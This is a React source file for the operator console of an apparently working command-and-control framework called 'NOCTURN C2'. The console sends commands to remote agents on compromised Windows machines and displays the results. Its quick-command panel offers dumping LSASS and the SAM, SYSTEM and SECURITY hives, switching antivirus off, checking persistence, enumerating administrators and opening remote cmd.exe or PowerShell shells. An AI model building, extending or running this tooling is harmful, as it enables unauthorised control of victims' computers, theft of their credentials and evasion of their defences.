import { useState, useEffect, useRef, useCallback } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import api from '../lib/api'

interface HistoryEntry {
  command: string
  output: string
  cwd: string
  time: string
  isError?: boolean
  pending?: boolean
}

const COMMAND_CATEGORIES = [
  { label: 'SYSTÈME',     icon: '//', cmds: ['whoami', 'hostname', 'systeminfo', 'net user', 'net localgroup administrators', 'check-admin'] },
  { label: 'FICHIERS',    icon: '//', cmds: ['dir', 'dir /a', 'tree', 'cd ..'] },
  { label: 'RÉSEAU',      icon: '//', cmds: ['ipconfig /all', 'netstat -ano', 'arp -a', 'route print'] },
  { label: 'PROCESSUS',   icon: '//', cmds: ['tasklist', 'tasklist /v'] },
  { label: 'CREDENTIALS', icon: '//', cmds: ['lsass', 'sam', 'system', 'security'] },
  { label: 'ANTIVIRUS',   icon: '//', cmds: ['av-status', 'av-off', 'av-on'] },
  { label: 'PERSISTANCE', icon: '//', cmds: ['check-persist'] },
  { label: 'SHELL',       icon: '//', cmds: ['shell cmd.exe', 'shell powershell.exe', 'shell_close'] },
  { label: 'AIDE',        icon: '//', cmds: ['help', 'quit'] },
]

export default function Console() {
  const { id } = useParams<{ id: string }>()
  const navigate = useNavigate()
  const [history, setHistory] = useState<HistoryEntry[]>([])
  const [command, setCommand] = useState('')
  const [currentCwd, setCurrentCwd] = useState('?')
  const [loading, setLoading] = useState(false)
  const [cmdIndex, setCmdIndex] = useState(-1)
  const [showSidebar, setShowSidebar] = useState(true)
  const terminalRef = useRef<HTMLDivElement>(null)
  const inputRef = useRef<HTMLInputElement>(null)

  const fetchHistory = useCallback(async () => {
    try {
      const res = await api.get(`/agents/${id}/history`)
      setHistory(res.data)
      if (res.data.length > 0) {
        setCurrentCwd(res.data[res.data.length - 1].cwd)
      }
    } catch {}
  }, [id])

  useEffect(() => { fetchHistory() }, [fetchHistory])

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [history])

  const sendCommand = async (cmd?: string) => {
    const toSend = (cmd || command).trim()
    if (!toSend || loading) return
    setLoading(true)
    setCommand('')
    setCmdIndex(-1)

    const pendingEntry: HistoryEntry = {
      command: toSend,
      output: '// awaiting response...',
      cwd: currentCwd,
      time: new Date().toLocaleTimeString(),
      isError: false,
      pending: true,
    }
    setHistory(prev => [...prev, pendingEntry])

    try {
      const res = await api.post(`/agents/${id}/execute`, { command: toSend })
      const newCwd = res.data.cwd || currentCwd
      setCurrentCwd(newCwd)
      setHistory(prev => [
        ...prev.slice(0, -1),
        { command: toSend, output: res.data.output, cwd: newCwd, time: new Date().toLocaleTimeString(), isError: false, pending: false }
      ])
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: { error?: string } } }
      setHistory(prev => [
        ...prev.slice(0, -1),
        { command: toSend, output: axiosErr.response?.data?.error || 'Erreur de communication', cwd: currentCwd, time: new Date().toLocaleTimeString(), isError: true, pending: false }
      ])
    } finally {
      setLoading(false)
      setTimeout(() => inputRef.current?.focus(), 50)
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      sendCommand()
    } else if (e.key === 'ArrowUp') {
      e.preventDefault()
      const newIdx = Math.min(cmdIndex + 1, history.length - 1)
      setCmdIndex(newIdx)
      setCommand(history[history.length - 1 - newIdx]?.command || '')
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      const newIdx = Math.max(cmdIndex - 1, -1)
      setCmdIndex(newIdx)
      setCommand(newIdx === -1 ? '' : history[history.length - 1 - newIdx]?.command || '')
    }
  }

  const mono: React.CSSProperties = { fontFamily: "'JetBrains Mono', monospace" }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100vh', background: '#060408', position: 'relative' }}>
      <div className="app-bg" />
      <div className="noise-overlay" />

      {/* ── Header ── */}
      <header style={{
        ...mono,
        position: 'relative', zIndex: 10,
        background: 'rgba(4,4,6,0.97)',
        borderBottom: '1px solid rgba(255,101,0,0.15)',
        backdropFilter: 'blur(12px)',
        height: 52, display: 'flex', alignItems: 'center',
        justifyContent: 'space-between', padding: '0 20px', flexShrink: 0,
      }}>
        {/* Left */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          <button
            onClick={() => navigate('/')}
            style={{ ...mono, fontSize: 10, letterSpacing: '0.12em', padding: '5px 10px', background: 'transparent', border: '1px solid rgba(255,101,0,0.2)', borderRadius: 2, color: 'rgba(255,101,0,0.6)', cursor: 'pointer', transition: 'all 0.2s', textTransform: 'uppercase' }}
            onMouseEnter={e => { e.currentTarget.style.color = '#FF6500'; e.currentTarget.style.borderColor = 'rgba(255,101,0,0.5)' }}
            onMouseLeave={e => { e.currentTarget.style.color = 'rgba(255,101,0,0.6)'; e.currentTarget.style.borderColor = 'rgba(255,101,0,0.2)' }}
          >
            ← DASHBOARD
          </button>
          <span style={{ color: 'rgba(255,101,0,0.3)', fontSize: 12 }}>/</span>
          <span style={{ ...mono, fontSize: 13, fontWeight: 700, color: '#F0F0F0', letterSpacing: '0.2em' }}>NOCTURN</span>
          <span style={{ color: 'rgba(255,101,0,0.3)', fontSize: 12 }}>/</span>
          <span style={{ ...mono, fontSize: 13, fontWeight: 700, color: '#FF6500', letterSpacing: '0.1em' }}>{id}</span>
          <div style={{ display: 'flex', alignItems: 'center', gap: 5, marginLeft: 4 }}>
            <div style={{ width: 5, height: 5, borderRadius: '50%', background: '#00ff88', boxShadow: '0 0 6px #00ff88', animation: 'pulse-dot 2s ease-in-out infinite' }} />
            <span style={{ ...mono, fontSize: 8, color: 'rgba(0,255,136,0.6)', letterSpacing: '0.15em' }}>LIVE</span>
          </div>
        </div>

        {/* Center: CWD */}
        <div style={{ ...mono, fontSize: 10, color: 'rgba(255,101,0,0.7)', background: 'rgba(255,101,0,0.06)', border: '1px solid rgba(255,101,0,0.15)', borderRadius: 2, padding: '4px 12px', letterSpacing: '0.05em', maxWidth: 400, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
          {currentCwd}
        </div>

        {/* Right */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          {loading && (
            <span style={{ ...mono, fontSize: 9, color: '#FF9500', letterSpacing: '0.15em', animation: 'pulse-dot 1s ease-in-out infinite' }}>// EXEC...</span>
          )}
          <button
            onClick={() => setHistory([])}
            style={{ ...mono, fontSize: 10, letterSpacing: '0.12em', padding: '5px 12px', background: 'transparent', border: '1px solid rgba(255,45,85,0.3)', borderRadius: 2, color: 'rgba(255,45,85,0.7)', cursor: 'pointer', transition: 'all 0.2s', textTransform: 'uppercase' }}
            onMouseEnter={e => { e.currentTarget.style.background = 'rgba(255,45,85,0.08)'; e.currentTarget.style.color = '#FF2D55' }}
            onMouseLeave={e => { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = 'rgba(255,45,85,0.7)' }}
          >
            // CLEAR
          </button>
          <button
            onClick={() => setShowSidebar(s => !s)}
            style={{ ...mono, fontSize: 10, letterSpacing: '0.12em', padding: '5px 12px', background: 'transparent', border: '1px solid rgba(255,101,0,0.2)', borderRadius: 2, color: 'rgba(255,101,0,0.5)', cursor: 'pointer', transition: 'all 0.2s', textTransform: 'uppercase' }}
            onMouseEnter={e => { e.currentTarget.style.color = '#FF6500'; e.currentTarget.style.borderColor = 'rgba(255,101,0,0.5)' }}
            onMouseLeave={e => { e.currentTarget.style.color = 'rgba(255,101,0,0.5)'; e.currentTarget.style.borderColor = 'rgba(255,101,0,0.2)' }}
          >
            {showSidebar ? '// HIDE' : '// CMDS'}
          </button>
        </div>
      </header>

      {/* ── Body ── */}
      <div style={{ display: 'flex', flex: 1, overflow: 'hidden', position: 'relative', zIndex: 1 }}>

        {/* Left sidebar: history */}
        <aside style={{ width: 176, borderRight: '1px solid rgba(255,101,0,0.1)', flexShrink: 0, overflowY: 'auto', background: 'rgba(4,4,6,0.9)', display: 'flex', flexDirection: 'column' }}>
          <div style={{ ...mono, fontSize: 8, letterSpacing: '0.25em', color: 'rgba(255,101,0,0.5)', padding: '10px 12px 8px', borderBottom: '1px solid rgba(255,101,0,0.08)', textTransform: 'uppercase' }}>
            // HISTORIQUE
          </div>
          {history.length === 0 && (
            <div style={{ ...mono, fontSize: 10, color: 'rgba(255,255,255,0.35)', padding: '12px', letterSpacing: '0.08em' }}>
              no commands yet
            </div>
          )}
          {history.slice().reverse().map((entry, i) => (
            <button
              key={i}
              onClick={() => !entry.pending && sendCommand(entry.command)}
              title={entry.command}
              style={{
                ...mono, width: '100%', textAlign: 'left', padding: '7px 12px', fontSize: 10,
                background: 'transparent', border: 'none', cursor: entry.pending ? 'default' : 'pointer',
                color: entry.isError ? '#FF2D55' : entry.pending ? '#FF9500' : 'rgba(255,255,255,0.5)',
                borderBottom: '1px solid rgba(255,101,0,0.05)',
                overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                letterSpacing: '0.02em',
                animation: entry.pending ? 'pulse-dot 1s ease-in-out infinite' : 'none',
                transition: 'color 0.15s',
              }}
              onMouseEnter={e => { if (!entry.pending) e.currentTarget.style.color = '#FF6500' }}
              onMouseLeave={e => { e.currentTarget.style.color = entry.isError ? '#FF2D55' : entry.pending ? '#FF9500' : 'rgba(255,255,255,0.5)' }}
            >
              <span style={{ color: 'rgba(255,101,0,0.4)', marginRight: 4 }}>›</span>{entry.command}
            </button>
          ))}
        </aside>

        {/* Terminal */}
        <div style={{ display: 'flex', flexDirection: 'column', flex: 1, overflow: 'hidden' }}>
          {/* Output area */}
          <div
            ref={terminalRef}
            style={{ flex: 1, overflowY: 'auto', padding: '20px 24px', background: 'rgba(6,4,8,0.95)', cursor: 'text' }}
            onClick={() => inputRef.current?.focus()}
          >
            {history.length === 0 && (
              <div style={{ ...mono, fontSize: 12, color: 'rgba(0,255,136,0.5)', letterSpacing: '0.05em', marginBottom: 8 }}>
                // NOCTURN C2 — Agent <span style={{ color: '#FF6500' }}>{id}</span> connected. Awaiting commands...
              </div>
            )}
            {history.map((entry, i) => (
              <div key={i} style={{ marginBottom: 16 }}>
                {/* Command line */}
                <div style={{ display: 'flex', alignItems: 'baseline', gap: 8, marginBottom: 4 }}>
                  <span style={{ ...mono, fontSize: 11, color: 'rgba(255,101,0,0.6)', flexShrink: 0 }}>{entry.cwd}</span>
                  <span style={{ ...mono, fontSize: 11, color: 'rgba(255,101,0,0.4)', flexShrink: 0 }}>›</span>
                  <span style={{ ...mono, fontSize: 12, color: '#FF6500', fontWeight: 600, letterSpacing: '0.03em' }}>{entry.command}</span>
                  <span style={{ ...mono, fontSize: 9, color: 'rgba(255,255,255,0.2)', marginLeft: 'auto', flexShrink: 0, letterSpacing: '0.05em' }}>{entry.time}</span>
                </div>
                {/* Output */}
                <pre style={{
                  ...mono, fontSize: 11, lineHeight: 1.7, margin: '0 0 0 16px',
                  whiteSpace: 'pre-wrap', wordBreak: 'break-all',
                  color: entry.isError ? '#FF2D55' : entry.pending ? 'rgba(255,149,0,0.6)' : 'rgba(255,255,255,0.75)',
                  animation: entry.pending ? 'pulse-dot 1.5s ease-in-out infinite' : 'none',
                  borderLeft: `2px solid ${entry.isError ? 'rgba(255,45,85,0.3)' : entry.pending ? 'rgba(255,149,0,0.3)' : 'rgba(0,255,136,0.2)'}`,
                  paddingLeft: 12,
                }}>
                  {entry.output}
                </pre>
              </div>
            ))}
            {loading && (
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ ...mono, fontSize: 11, color: 'rgba(255,101,0,0.6)' }}>{currentCwd} ›</span>
                <span style={{ ...mono, fontSize: 12, color: '#FF6500', animation: 'cursor-blink 1s step-end infinite' }}>█</span>
              </div>
            )}
          </div>

          {/* Input bar */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: 10,
            padding: '0 20px', height: 48, flexShrink: 0,
            background: 'rgba(4,4,6,0.98)',
            borderTop: '1px solid rgba(255,101,0,0.2)',
            boxShadow: '0 -4px 20px rgba(255,101,0,0.04)',
          }}>
            <span style={{ ...mono, fontSize: 11, color: 'rgba(255,101,0,0.5)', flexShrink: 0, letterSpacing: '0.05em' }}>
              {currentCwd} <span style={{ color: '#FF6500' }}>›</span>
            </span>
            <input
              ref={inputRef}
              type="text"
              value={command}
              onChange={e => setCommand(e.target.value)}
              onKeyDown={handleKeyDown}
              disabled={loading}
              placeholder={loading ? '// executing...' : '// type command...'}
              style={{
                ...mono, flex: 1, background: 'transparent', border: 'none', outline: 'none',
                fontSize: 12, color: '#F0F0F0', letterSpacing: '0.03em',
                caretColor: '#FF6500',
              }}
              autoFocus
            />
            {command && (
              <button
                onClick={() => sendCommand()}
                style={{ ...mono, fontSize: 9, letterSpacing: '0.15em', padding: '4px 10px', background: 'rgba(255,101,0,0.1)', border: '1px solid rgba(255,101,0,0.4)', borderRadius: 2, color: '#FF6500', cursor: 'pointer', textTransform: 'uppercase', flexShrink: 0 }}
              >
                EXEC ↵
              </button>
            )}
          </div>
        </div>

        {/* Right sidebar: commands */}
        {showSidebar && (
          <aside style={{ width: 200, borderLeft: '1px solid rgba(255,101,0,0.1)', flexShrink: 0, overflowY: 'auto', background: 'rgba(4,4,6,0.9)' }}>
            <div style={{ ...mono, fontSize: 8, letterSpacing: '0.25em', color: 'rgba(255,101,0,0.5)', padding: '10px 12px 8px', borderBottom: '1px solid rgba(255,101,0,0.08)', textTransform: 'uppercase' }}>
              // COMMANDES
            </div>
            {COMMAND_CATEGORIES.map(cat => (
              <div key={cat.label} style={{ borderBottom: '1px solid rgba(255,101,0,0.06)' }}>
                <div style={{ ...mono, fontSize: 8, letterSpacing: '0.2em', color: 'rgba(255,101,0,0.45)', padding: '8px 12px 5px', background: 'rgba(255,101,0,0.03)', textTransform: 'uppercase' }}>
                  {cat.icon} {cat.label}
                </div>
                {cat.cmds.map(cmd => (
                  <button
                    key={cmd}
                    onClick={() => sendCommand(cmd)}
                    style={{
                      ...mono, width: '100%', textAlign: 'left', padding: '6px 12px 6px 20px',
                      fontSize: 10, background: 'transparent', border: 'none', cursor: 'pointer',
                      color: 'rgba(255,255,255,0.65)', borderBottom: '1px solid rgba(255,101,0,0.04)',
                      letterSpacing: '0.02em', transition: 'all 0.15s',
                    }}
                    onMouseEnter={e => { e.currentTarget.style.color = '#FF6500'; e.currentTarget.style.background = 'rgba(255,101,0,0.06)'; e.currentTarget.style.paddingLeft = '16px' }}
                    onMouseLeave={e => { e.currentTarget.style.color = 'rgba(255,255,255,0.65)'; e.currentTarget.style.background = 'transparent'; e.currentTarget.style.paddingLeft = '20px' }}
                  >
                    {cmd}
                  </button>
                ))}
              </div>
            ))}
          </aside>
        )}
      </div>
    </div>
  )
}
